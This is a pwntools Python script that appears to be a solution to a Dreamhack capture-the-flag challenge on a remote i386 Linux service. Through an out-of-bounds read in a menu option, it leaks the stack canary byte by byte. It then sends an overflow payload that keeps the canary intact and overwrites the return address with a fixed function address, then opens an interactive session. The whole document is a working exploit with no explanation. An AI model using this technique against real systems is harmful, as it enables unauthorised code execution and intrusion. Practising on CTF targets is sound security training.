from pwn import *

context.arch = "i386"
context.os = "linux"

p = remote("host3.dreamhack.games", 8704)

canary = 0

for i in range(4):
	p.sendlineafter(b"> ", b"P")
	p.sendlineafter(b"Element index : ", str(0x80 + i).encode())
	p.recvuntil(b"is : ")
	
	byte = int(p.recvuntil(b"\n", drop=True), 16)
	
	canary |= byte << (8 * i)


payload = b"A" * 0x40 + p32(canary) + b"A" * 8 + p32(0x80486b9) 

p.sendlineafter(b"> ", b"E")
p.sendlineafter(b"Name Size : ", str(0x50).encode())
p.sendlineafter(b"Name : ", payload)

p.interactive()
